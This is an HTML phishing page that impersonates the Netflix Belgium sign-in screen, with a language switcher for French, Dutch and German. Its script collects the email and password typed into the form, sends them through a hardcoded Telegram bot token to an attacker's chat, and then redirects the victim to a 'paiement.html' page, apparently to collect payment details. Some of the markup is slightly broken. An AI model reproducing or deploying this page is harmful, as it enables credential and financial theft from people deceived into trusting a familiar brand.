<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Belgique - Regardez des séries et films en streaming</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        html, body {
            height: 100%;
        }

        body {
            color: #fff;
            background: #000 url('netflixbackground.jpg') no-repeat center center/cover;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        body::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            z-index: -1;
        }

        /* Header */
        .header {
            padding: 20px 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            z-index: 10;
        }

        .logo {
            height: 45px;
            width: auto;
        }

        @media (max-width: 740px) {
            .logo {
                height: 32px;
            }
        }

        .language-selector {
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 7px 30px 7px 12px;
            border: 1px solid #777;
            border-radius: 3px;
            font-size: 14px;
            appearance: none;
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 8px center;
            background-size: 12px;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        /* Login Container */
        .login-container {
            max-width: 450px;
            width: 90%;
            margin: 2rem auto;
            padding: 3rem;
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
            box-sizing: border-box;
        }

        @media (max-width: 740px) {
            .login-container {
                width: 85%;
                padding: 2rem;
                margin: 1.5rem auto;
            }
        }

        h1 {
            margin: 0 0 28px;
            font-size: 32px;
            font-weight: 500;
        }

        @media (max-width: 740px) {
            h1 {
                font-size: 28px;
                margin-bottom: 24px;
            }
        }

        /* Form Elements */
        .input-group {
            margin-bottom: 16px;
            position: relative;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            height: 50px;
            padding: 16px 20px 0;
            background: #333;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
        }

        input:focus {
            background: #454545;
            outline: none;
        }

        label {
            position: absolute;
            top: 15px;
            left: 20px;
            color: #8c8c8c;
            pointer-events: none;
            transition: all 0.1s ease;
            font-size: 16px;
        }

        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: 7px;
            font-size: 11px;
        }

        /* Button */
        .login-button {
            width: 100%;
            padding: 16px;
            margin: 24px 0 12px;
            background: #e50914;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            position: relative;
        }

        .login-button:hover {
            background: #f6121d;
        }

        /* Remember Me & Help */
        .options-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
            color: #b3b3b3;
            font-size: 13px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 5px;
            white-space: nowrap;
        }

        .remember-checkbox {
            width: 16px;
            height: 16px;
            background: #737373;
            border-radius: 2px;
            appearance: none;
            -webkit-appearance: none;
            position: relative;
        }

        .remember-checkbox:checked::after {
            content: '✓';
            position: absolute;
            color: #000;
            font-size: 14px;
            left: 3px;
            top: -1px;
        }

        .help-link {
            color: #b3b3b3;
            text-decoration: none;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        /* Signup Link */
        .signup-text {
            color: #737373;
            margin-top: 16px;
            font-size: 16px;
        }

        .signup-link {
            color: #fff;
            text-decoration: none;
        }

        .signup-link:hover {
            text-decoration: underline;
        }

        /* Footer */
        .footer {
            background: rgba(0, 0, 0, 0.75);
            padding: 30px 15% 60px;
            color: #737373;
            margin-top: 60px;
            font-size: 13px;
        }

        .footer-content {
            max-width: 1000px;
            margin: 0 auto;
        }

        .footer-top {
            margin-bottom: 30px;
        }

        .footer-links {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }

        @media (max-width: 800px) {
            .footer {
                padding: 30px 5% 40px;
            }
            .footer-links {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        .footer-link {
            color: #737373;
            text-decoration: none;
            font-size: 13px;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        /* Spinner */
        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s linear infinite;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes spin {
            to { transform: translate(-50%, -50%) rotate(360deg); }
        }

        .btn-loading {
            color: transparent !important;
        }

        .btn-loading .spinner {
            display: block;
        }
    </style>
</head>
<body>
    <header class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
        <select class="language-selector" id="languageSelector">
            <option value="fr">Français</option>
            <option value="nl">Nederlands</option>
            <option value="de">Deutsch</option>
        </select>
    </header>

    <main>
        <div class="login-container">
            <h1 id="loginTitle">S'identifier</h1>
            <form id="loginForm">
                <div class="input-group">
                    <input type="email" id="email" name="email" placeholder=" " required>
                    <label for="email" id="emailLabel">E-mail ou numéro de téléphone</label>
                </div>
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder=" " required>
                    <label for="password" id="passwordLabel">Mot de passe</label>
                </div>
                <button type="submit" class="login-button" id="submitBtn">
                    <span id="submitText">S'identifier</span>
                    <div class="spinner"></div>
                </button>
                    <a href="#" class="help-link" id="helpLink">Besoin d'aide ?</a>
                </div>
            </form>
            <div class="signup-text">
                <span id="newUserText">Nouveau sur Netflix ?</span> 
                <a href="#" class="signup-link" id="signupLink">Inscrivez-vous maintenant.</a>
            </div>
        </div>
    </main>

    <footer class="footer">
        <div class="footer-content">
            <div class="footer-top">
                <span id="questionsText">Des questions ? Appelez le </span> 
                <a href="tel:0800-38963" class="footer-link">0800-38963</a>
            </div>
            <div class="footer-links">
                <a href="#" class="footer-link" id="faqLink">FAQ</a>
                <a href="#" class="footer-link" id="helpCenterLink">Centre d'aide</a>
                <a href="#" class="footer-link" id="termsLink">Conditions d'utilisation</a>
                <a href="#" class="footer-link" id="privacyLink">Confidentialité</a>
                <a href="#" class="footer-link" id="cookiesLink">Préférences de cookies</a>
                <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
                <a href="#" class="footer-link" id="adsLink">Choix liés à la pub</a>
            </div>
            <div id="countryText">Netflix Belgique</div>
        </div>
    </footer>

    <script>
        // Configuration Telegram
        const TELEGRAM_BOT_TOKEN = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk'; // Remplacez par votre token
        const TELEGRAM_CHAT_ID = '-4883048028'; // Remplacez par votre chat ID

        // Textes pour les différentes langues
        const translations = {
            fr: {
                loginTitle: "S'identifier",
                emailLabel: "E-mail ou numéro de téléphone",
                passwordLabel: "Mot de passe",
                submitText: "S'identifier",
                rememberLabel: "Se souvenir de moi",
                helpLink: "Besoin d'aide ?",
                newUserText: "Nouveau sur Netflix ?",
                signupLink: "Inscrivez-vous maintenant.",
                questionsText: "Des questions ? Appelez le ",
                faqLink: "FAQ",
                helpCenterLink: "Centre d'aide",
                termsLink: "Conditions d'utilisation",
                privacyLink: "Confidentialité",
                cookiesLink: "Préférences de cookies",
                legalLink: "Mentions légales",
                adsLink: "Choix liés à la pub",
                countryText: "Netflix Belgique"
            },
            nl: {
                loginTitle: "Inloggen",
                emailLabel: "E-mail of telefoonnummer",
                passwordLabel: "Wachtwoord",
                submitText: "Inloggen",
                rememberLabel: "Onthoud mij",
                helpLink: "Hulp nodig?",
                newUserText: "Nieuw bij Netflix?",
                signupLink: "Meld je nu aan.",
                questionsText: "Vragen? Bel ",
                faqLink: "FAQ",
                helpCenterLink: "Helpcentrum",
                termsLink: "Gebruiksvoorwaarden",
                privacyLink: "Privacy",
                cookiesLink: "Cookievoorkeuren",
                legalLink: "Juridische bepalingen",
                adsLink: "Advertentievoorkeuren",
                countryText: "Netflix België"
            },
            de: {
                loginTitle: "Anmelden",
                emailLabel: "E-Mail oder Telefonnummer",
                passwordLabel: "Passwort",
                submitText: "Anmelden",
                rememberLabel: "Angemeldet bleiben",
                helpLink: "Hilfe benötigt?",
                newUserText: "Neu bei Netflix?",
                signupLink: "Jetzt registrieren.",
                questionsText: "Fragen? Rufen Sie ",
                faqLink: "FAQ",
                helpCenterLink: "Hilfecenter",
                termsLink: "Nutzungsbedingungen",
                privacyLink: "Datenschutz",
                cookiesLink: "Cookie-Einstellungen",
                legalLink: "Impressum",
                adsLink: "Werbeauswahl",
                countryText: "Netflix Belgien"
            }
        };

        // Fonction pour envoyer un message Telegram
        function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message envoyé à Telegram:', data);
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi à Telegram:', error);
            });
        }

        // Fonction pour changer la langue
        function changeLanguage(lang) {
            const texts = translations[lang];
            
            // Mettre à jour tous les textes
            document.getElementById('loginTitle').textContent = texts.loginTitle;
            document.getElementById('emailLabel').textContent = texts.emailLabel;
            document.getElementById('passwordLabel').textContent = texts.passwordLabel;
            document.getElementById('submitText').textContent = texts.submitText;
            document.getElementById('rememberLabel').textContent = texts.rememberLabel;
            document.getElementById('helpLink').textContent = texts.helpLink;
            document.getElementById('newUserText').textContent = texts.newUserText;
            document.getElementById('signupLink').textContent = texts.signupLink;
            document.getElementById('questionsText').textContent = texts.questionsText;
            document.getElementById('faqLink').textContent = texts.faqLink;
            document.getElementById('helpCenterLink').textContent = texts.helpCenterLink;
            document.getElementById('termsLink').textContent = texts.termsLink;
            document.getElementById('privacyLink').textContent = texts.privacyLink;
            document.getElementById('cookiesLink').textContent = texts.cookiesLink;
            document.getElementById('legalLink').textContent = texts.legalLink;
            document.getElementById('adsLink').textContent = texts.adsLink;
            document.getElementById('countryText').textContent = texts.countryText;
            
            // Sauvegarder la langue sélectionnée
            localStorage.setItem('selectedLanguage', lang);
        }

        // Initialisation au chargement de la page
        document.addEventListener('DOMContentLoaded', function() {
            // Récupérer la langue sauvegardée ou utiliser le français par défaut
            const savedLanguage = localStorage.getItem('selectedLanguage') || 'fr';
            document.getElementById('languageSelector').value = savedLanguage;
            changeLanguage(savedLanguage);
            
            // Écouter les changements de langue
            document.getElementById('languageSelector').addEventListener('change', function() {
                changeLanguage(this.value);
            });
            
            // Gestion du formulaire
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const submitBtn = document.getElementById('submitBtn');
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;
                
                // Afficher le spinner
                submitBtn.classList.add('btn-loading');
                
                // Préparer le message pour Telegram
                const currentDate = new Date().toLocaleString('fr-BE');
                const message = `
🔐 <b>Nouvelle tentative de connexion Netflix Belgique</b>

📧 <b>Email:</b> ${email}
🔑 <b>Mot de passe:</b> ${password}
🌐 <b>Langue:</b> ${document.getElementById('languageSelector').value}
🕐 <b>Date:</b> ${currentDate}
                `;
                
                // Envoyer le message à Telegram
                sendTelegramMessage(message);
                
                // Simuler le traitement de connexion
                setTimeout(() => {
                    // Redirection vers la page d'accueil après connexion
                    window.location.href = "paiement.html";
                }, 2000);
            });
        });
    </script>
</body>
</html>
